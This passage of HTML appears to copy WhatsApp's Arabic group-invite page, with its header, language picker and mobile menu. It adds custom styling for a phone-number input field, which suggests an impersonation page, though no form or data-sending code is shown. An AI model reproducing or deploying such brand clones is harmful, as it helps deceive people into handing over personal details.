        <link href="https://static.whatsapp.net/rsrc.php/v3iJoa4/yD/l/ar_AR/Yj6N6yD3D5b.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
        <script src="https://static.whatsapp.net/rsrc.php/v3iJoa4/yD/l/ar_AR/Yj6N6yD3D5b.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="aLWBuAr"></script>
        <link href="https://static.whatsapp.net/rsrc.php/v3/yo/r/V3scni4amIg.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
        <script src="https://static.whatsapp.net/rsrc.php/v3/yo/r/V3scni4amIg.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="PKg8B8N"></script>
        <link href="https://static.whatsapp.net/rsrc.php/v3/ya/r/ZL1A46FYUm6.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
        <script src="https://static.whatsapp.net/rsrc.php/v3/ya/r/ZL1A46FYUm6.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="8TNZYzX"></script>
        <link href="https://static.whatsapp.net/rsrc.php/v3iVNN4/y6/l/ar_AR/qd3BkPntgTu.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous">
        <script src="https://static.whatsapp.net/rsrc.php/v3iVNN4/y6/l/ar_AR/qd3BkPntgTu.js?_nc_x=Ij3Wp8lg5Kz" async="" crossorigin="anonymous" data-bootloader-hash-client="15HqZfD"></script>
        <link rel="stylesheet" href="build/css/intlTelInput.css">
<!--          <link rel="stylesheet" href="build/css/demo.css">-->
          <style>
    .input-phone{
     /* background-color: #389880; */
    border-top: none;
    border-left: none;
    border-right: none;
    width: 75%;
    border-bottom: 3px solid #36ba6d;
    }
    .iti__flag.iti__sa {
    height: 14px;
    background-position: -4339px 0px;
    visibility: hidden;
}
::placeholder {
    text-align: center;
    margin-top:-4px;
}
.form-group {
  margin-bottom: $form-group-margin-bottom;
}

/* _forms.scss:284 */
.form-group {
  display: flex;
  flex: 0 0 auto;
  flex-flow: row wrap;
  align-items: center;
  margin-bottom: 0;
}
.button_a {
    border-radius: 5px;
    display: inline-block;
    font-size: 17px;
    font-weight: 500;
    height: 47px;
    width: 131px;
    /*letter-spacing: .071em;*/
    line-height: 51px;
  /*padding: 14px 14px 14px 14px;*/
    text-transform: uppercase;
    white-space: nowrap;
    background-color: #128c7e;
    color: #fff;
}
.iti--separate-dial-code .iti__selected-flag {
    background-color: rgba(0, 0, 0, 0.05);
    margin-right: -78px;
    direction: ltr;
}
@media only screen and (max-width: 768px) {
.button_a {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
        border-radius: 5px;
    display: inline-block;
    font-size: 12px;
    font-weight: 500;
    height: 42px;
    width: 113px;
  /*  letter-spacing: .071em;*/
    margin-right: 12px;
    line-height: 44px;
    /*padding: 14px 14px 14px 14px;*/
    text-transform: uppercase;
    white-space: nowrap;
    background-color: #128c7e;
    color: #fff;
}
}
._2yz0 ._2z07 {
   
}
._2yz0 ._2y_c {
   border-radius: 5px;
    display: inline-block;
    font-size: 12px;
    height: 21px;
    font-weight: 500;
    /*letter-spacing: .071em;*/
    line-height: 19px;
    padding: 1px 9px;
    margin-right: -93px;
    text-transform: uppercase;
    white-space: nowrap;
}
    :focus{
        outline:none;
    }
._2yz0 ._2z07 {
    background-color: #128c7e;
    color: #fff!important;
}

.button_a {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    border-radius: 5px;
    display: inline-block;
    font-size: 12px;
    font-weight: 500;
    height: 44px;
    width: 113px;
    letter-spacing: .071em;
    margin-right: 12px;
    line-height: 46px;
    /* padding: 14px 14px 14px 14px; */
    text-transform: uppercase;
    white-space: nowrap;
    background-color: #128c7e;
    color: #fff;
}
._2yz0 ._2y_d label, ._2yz0 ._2y_d input, ._2yz0 ._2y_d button {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    width: 147px;
    height: 26px;
    padding: 10px;
    line-height: 11px;
   /* font-size: 14px;*/
}
._2yz0 ._2z07 {
    background-color: #128c7e;
    color: #fff!important;
}


  </style>
    </head>

    <body id="top-of-page" class="_2yz0 _9sca _aiux  ar chrome webkit win x1 Locale_ar_AR" dir="rtl">
        <script type="text/javascript" nonce="">
            requireLazy(["bootstrapWebSession"], function(j) {
                j(1671897073)
            })
        </script>
        <div data-testid="whatsapp_www_full_page" class="_2ywh _li _9kh2" style="visibility: hidden">
            <div class="_2y_d _9rxy">
                <div class="_9r_7 _9t33">
                    <header class="_9tjr" data-testid="whatsapp_www_header">
                        <div class="_9tjs">
                            <div class="_9tjt"><span class="_9tig"><a href="https://www.whatsapp.com/" class="_9vcv"><span class="_advp _aeam"><img alt="صفحة واتساب الرئيسية" src="https://static.whatsapp.net/rsrc.php/ym/r/36B424nhiL4.svg"></span></a></span><span class="_9tih"><a data-testid="whatsapp_www_header_logo_link" href="https://www.whatsapp.com/" class="_9vcv"><span class="_advp _aeam"><img class="_9v93" alt="صفحة واتساب الرئيسية" src="https://static.whatsapp.net/rsrc.php/yz/r/lOol7j-zq4u.svg"></span></a></span><a href="/--sanitized-S228802--" class="_9vc_ _9vcv" rel="noopener"><span class="_advp _aeam">الدعوة للانضمام إلى مجموعة واتساب</span></a></div>
                            <div class="_9tju"><span class="_9tif _a496"><a href="https://web.whatsapp.com/" class="_9vcv"><span class="_advp _aeam">
                                            <h5 class="_9vd5" style="color:#FFFFFF;">واتساب ويب</h5>
                                        </span></a><a href="https://www.whatsapp.com/features" class="_9vcv"><span class="_advp _aeam">
                                            <h5 class="_9vd5" style="color:#FFFFFF;">الخصائص</h5>
                                        </span></a><a href="https://www.whatsapp.com/download" class="_9vcv"><span class="_advp _aeam">
                                            <h5 class="_9vd5" style="color:#FFFFFF;">تنزيل</h5>
                                        </span></a><a href="https://www.whatsapp.com/privacy" class="_9vcv"><span class="_advp _aeam">
                                            <h5 class="_9vd5" style="color:#FFFFFF;">الخصوصية</h5>
                                        </span></a><a href="https://faq.whatsapp.com/" class="_9vcv"><span class="_advp _aeam">
                                            <h5 class="_9vd5" style="color:#FFFFFF;">مركز المساعدة</h5>
                                        </span></a></span><span class="_9tij">
                                    <div class=""><button data-testid="language-picker" class="_9tib _ain3 _9vcv" id="u_0_0_XR"><span class="_advp _aeam">
                                                <div class="_9tic"><svg x="0" y="0" width="19px" height="19px" viewBox="0 0 19 19" style="enable-background:new 0 0 19 19;" role="img" space="preserve">
                                                        <path d="M9.5,2C5.4,2,2,5.4,2,9.5S5.4,17,9.5,17c4.1,0,7.5-3.4,
              7.5-7.5S13.6,2,9.5,2z M14.7,6.5h-2.2c-0.2-1-0.6-1.8-1.1-2.7C12.8,
              4.3,14,
              5.2,14.7,
              6.5z M9.5,3.5c0.6,0.9,1.1,1.9,1.4,3H8.1C8.4,
              5.4,8.9,4.4,9.5,3.5z M3.7,
              11c-0.2-0.5-0.2-1-0.2-1.5C3.5,9,3.5,8.4,3.7,8h2.6C6.2,8.5,
              6.2,9,6.2,9.5c0,0.5,
              0.1,1,0.1,1.5H3.7z M4.3,12.5h2.2c0.2,1,0.6,1.8,
              1.1,2.7C6.2,14.7,5,13.8,4.3,
              12.5z M6.5,6.5H4.3c0.8-1.3,1.9-2.2,3.2-2.7C7.1,
              4.7,6.7,5.5,6.5,6.5z M9.5,
              15.5c-0.6-0.9-1.1-1.9-1.4-3h2.9C10.6,13.6,10.1,
              14.6,9.5,15.5z M11.2,
              11H7.8c-0.1-0.5-0.2-1-0.2-1.5c0-0.5,0.1-1,
              0.2-1.5h3.5c0.1,0.5,0.2,1,0.2,
              1.5C11.5,10,
              11.3,10.5,11.2,11z M11.5,15.2c0.5-0.8,0.8-1.7,1.1-2.7h2.2C14,
              13.8,12.8,14.7,11.5,
              15.2z M12.8,11c0.1-0.5,0.1-1,0.1-1.5c0-0.5-0.1-1-0.1-1.5h2.6c0.2,
              0.5,0.2,1,0.2,
              1.5c0,0.5-0.1,1.1-0.2,1.5H12.8z" fill="currentColor"></path>
                                                    </svg>
                                                    <h5 class="_9vd5 _9tnd" style="color:#FFFFFF;">العربية</h5><svg x="0" y="0" width="9px" height="20px" viewBox="0 0 9 20" class="_af8h _a0g7">
                                                        <polygon fill="currentColor" points="1,9 4.5,12.5 8,9 "></polygon>
                                                    </svg>
                                                </div>
                                            </span></button>
                                        <div class="_9te3 hidden_elem" id="u_0_1_R7">
                                            <div data-testid="language-picker-container" class="_9te5">
                                                <div class="_9tie">
                                                    <h3 class="_9vd5">تحديد اللغة</h3><button class="_9tid _ain3 _9vcv" id="u_0_2_Le"><span class="_advp _aeam"><svg width="8" height="5" fill="none" class="_a83i">
                                                                <path d="M4 0l3.464 4.5H.536L4 0z" fill="currentColor">
                                                                </path>
                                                            </svg></span></button>
                                                </div>
                                                <ul class="_9te7">
                                                    <li class="_9te8"><a data-testid="azərbaycan" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=az" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">azərbaycan</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Afrikaans" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=af" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Afrikaans</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Bahasa Indonesia" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=id" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Bahasa Indonesia</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Melayu" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ms" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Melayu</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="català" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ca" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">català</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="čeština" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=cs" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">čeština</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="dansk" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=da" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">dansk</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Deutsch" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=de" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Deutsch</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="eesti" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=et" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">eesti</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="English" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=en" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">English</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="español" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=es" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">español</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="français" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=fr" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">français</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Gaeilge" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ga" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Gaeilge</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="hrvatski" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=hr" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">hrvatski</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="italiano" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=it" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">italiano</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Kiswahili" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=sw" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Kiswahili</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="latviešu" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=lv" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">latviešu</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="lietuvių" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=lt" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">lietuvių</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="magyar" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=hu" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">magyar</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Nederlands" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=nl" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Nederlands</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="norsk bokmål" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=nb" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">norsk bokmål</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="o‘zbek" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=uz" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">o‘zbek</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Filipino" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=tl" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Filipino</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="polski" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=pl" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">polski</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Português (Brasil)" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_br" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Português (Brasil)</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Português (Portugal)" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=pt_pt" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Português (Portugal)</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="română" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ro" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">română</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="shqip" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=sq" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">shqip</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="slovenčina" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=sk" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">slovenčina</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="slovenščina" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=sl" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">slovenščina</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="suomi" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=fi" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">suomi</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="svenska" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=sv" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">svenska</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Tiếng Việt" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=vi" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Tiếng Việt</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Türkçe" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=tr" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Türkçe</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="Ελληνικά" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=el" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">Ελληνικά</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="български" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=bg" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">български</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="қазақ тілі" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=kk" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">қазақ тілі</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="македонски" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=mk" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">македонски</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="русский" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ru" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">русский</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="српски" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=sr" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">српски</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="українська" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=uk" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">українська</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="עברית" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=he" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">עברית</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="العربية" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ar" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5" style="color:#128C7E;">العربية</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="فارسی" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=fa" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">فارسی</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="اردو" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ur" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">اردو</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="বাংলা" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=bn" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">বাংলা</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="हिन्दी" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=hi" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">हिन्दी</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="ગુજરાતી" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=gu" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">ગુજરાતી</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="ಕನ್ನಡ" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=kn" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">ಕನ್ನಡ</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="मराठी" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=mr" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">मराठी</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="ਪੰਜਾਬੀ" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=pa" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">ਪੰਜਾਬੀ</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="தமிழ்" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ta" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">தமிழ்</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="తెలుగు" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=te" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">తెలుగు</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="മലയാളം" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ml" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">മലയാളം</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="ไทย" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=th" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">ไทย</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="简体中文" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_cn" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">简体中文</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="繁體中文（台灣）" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_tw" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">繁體中文（台灣）</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="繁體中文（香港）" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=zh_hk" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">繁體中文（香港）</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="日本語" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ja" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">日本語</h4>
                                                            </span></a></li>
                                                    <li class="_9te8"><a data-testid="한국어" class="_9teb _9vcv" href="https://chat.whatsapp.com/--sanitized-S228802--?lang=ko" dir="auto"><span class="_advp _aeam">
                                                                <h4 class="_9vd5">한국어</h4>
                                                            </span></a></li>
                                                </ul>
                                            </div>
                                            <div class="_9te2" id="u_0_3_8q"></div>
                                        </div>
                                    </div>
                                </span>
                                <div class="_9tii">
                                    <div class="_af8g"><button aria-label="فتح قائمة الهاتف المحمول" class="_afvu _ain3 _9vcv" id="u_0_4_J6"><span class="_advp _aeam"><svg width="20" height="16" fill="none" class="_af8f">
                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0h19.913v2H0V0zm-.006 6.916h19.917v1.995H-.006V6.916zm0 7.328h19.917v1.994H-.006v-1.994z" fill="currentColor"></path>
                                                </svg></span></button>
                                        <nav class="_9t0g _9sde _9sd1" id="u_0_5_Ts"><svg width="36" height="36" fill="none" class="_9t0j">
                                                <path d="M1.757 34.14l2.304-8.394a16.177 16.177 0 01-2.167-8.087c0-8.923 7.268-16.192 16.191-16.192 4.334 0 8.395 1.69 11.466 4.743a16.109 16.109 0 014.743 11.449c0 8.923-7.268 16.191-16.192 16.191-2.712 0-5.374-.682-7.746-1.979l-8.599 2.27z" fill="url(#1_paint0_linear)"></path>
                                                <path fill="url(#1_pattern0)" d="M0 0h36v36H0z"></path>
                                                <path d="M1.177 34.72l2.389-8.684a16.736 16.736 0 01-2.235-8.377C1.314 8.394 8.838.87 18.085.87c4.488 0 8.702 1.74 11.875 4.914a16.673 16.673 0 014.914 11.875c0 9.247-7.524 16.771-16.772 16.771-2.815 0-5.562-.7-8.019-2.047L1.177 34.72zm9.299-5.357l.512.307a13.955 13.955 0 007.097 1.945c7.678 0 13.94-6.261 13.94-13.94 0-3.719-1.45-7.233-4.078-9.86a13.89 13.89 0 00-9.862-4.096C10.39 3.72 4.13 9.981 4.13 17.66c0 2.627.734 5.204 2.133 7.422l.324.529-1.416 5.152 5.306-1.399z" fill="url(#1_paint1_linear)"></path>
                                                <path fill="url(#1_pattern1)" d="M8.019 8.531h20.133v18.938H8.019z"></path>
                                                <path fill-rule="evenodd" clip-rule="evenodd" d="M13.905 10.63c-.307-.7-.648-.717-.938-.717-.256-.017-.53-.017-.82-.017-.272 0-.733.102-1.125.529-.393.426-1.467 1.433-1.467 3.497 0 2.065 1.501 4.061 1.706 4.334.204.273 2.9 4.64 7.166 6.33 3.548 1.399 4.265 1.126 5.033 1.04.767-.085 2.474-1.006 2.832-1.996.341-.972.341-1.825.239-1.996-.102-.17-.393-.273-.802-.495-.427-.204-2.474-1.228-2.866-1.365-.393-.136-.666-.204-.939.205-.273.427-1.075 1.365-1.33 1.638-.24.273-.495.307-.905.102-.426-.204-1.774-.648-3.378-2.081-1.246-1.11-2.082-2.491-2.338-2.9-.238-.427-.034-.649.188-.854.188-.187.427-.494.632-.733.204-.24.272-.427.426-.7.136-.273.068-.529-.034-.733-.103-.188-.904-2.253-1.28-3.089z" fill="#fff"></path>
                                                <defs>
                                                    <linearGradient id="1_paint0_linear" x1="18.022" y1="34.139" x2="18.022" y2="1.461" gradientUnits="userSpaceOnUse">
                                                        <stop stop-color="#20B038"></stop>
                                                        <stop offset="1" stop-color="#60D66A"></stop>
                                                    </linearGradient>
                                                    <linearGradient id="1_paint1_linear" x1="18.022" y1="34.724" x2="18.022" y2="0.875" gradientUnits="userSpaceOnUse">
                                                        <stop stop-color="#F9F9F9"></stop>
                                                        <stop offset="1" stop-color="#fff"></stop>
                                                    </linearGradient>
                                                    <pattern id="1_pattern0" patternContentUnits="objectBoundingBox" width="1" height="1">
                                                        <use xlink:href="#1_image0"></use>
                                                    </pattern>
                                                    <pattern id="1_pattern1" patternContentUnits="objectBoundingBox" width="1" height="1">
                                                        <use xlink:href="#1_image1"></use>
                                                    </pattern>
                                                    <image id="1_image0" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANMAAADTCAYAAAAbBybZAAAACXBIWXMAAAsSAAALEgHS3X78AAAA">
                                                    </image>
                                                    <image id="1_image1" xlink:href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHYAAABvCAYAAAA5fjRCAAAACXBIWXMAAAsSAAALEgHS3X78AAAA">
                                                    </image>
                                                </defs>
                                            </svg><button aria-label="إغلاق قائمة الهاتف المحمول" class="_9t0i _ain3 _9vcv" id="u_0_6_Eo"><span class="_advp _aeam"><svg width="16" height="16" fill="none" class="_9s6z">
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M15.495 1.353L14.364.222 7.859 6.727 1.637.505.507 1.636l6.22 6.222-6.505 6.506 1.131 1.131L7.86 8.99l6.79 6.79 1.13-1.132-6.788-6.79 6.504-6.504z" fill="currentColor"></path>
                                                    </svg></span></button>
                                            <ul class="_9t0k _a4cd">
                                                <li class="_9t0h">
                                                    <h4 class="_9vd5" style="color:#FFFFFF;"><a href="https://www.whatsapp.com/download/" class="_9vcv"><span class="_advp _aeam">تنزيل</span></a></h4>
                                                </li>
                                                <li class="_9t0h">
                                                    <h4 class="_9vd5" style="color:#FFFFFF;"><a href="https://www.whatsapp.com/features/" class="_9vcv"><span class="_advp _aeam">الخصائص</span></a></h4>
                                                </li>
                                                <li class="_9t0h">
                                                    <h4 class="_9vd5" style="color:#FFFFFF;"><a href="https://www.whatsapp.com/privacy/" class="_9vcv"><span class="_advp _aeam">الخصوصية</span></a></h4>
                                                </li>
                                                <li class="_9t0h">
                                                    <h4 class="_9vd5" style="color:#FFFFFF;"><a href="https://faq.whatsapp.com/" class="_9vcv"><span class="_advp _aeam">مركز المساعدة</span></a></h4>
                                                </li>
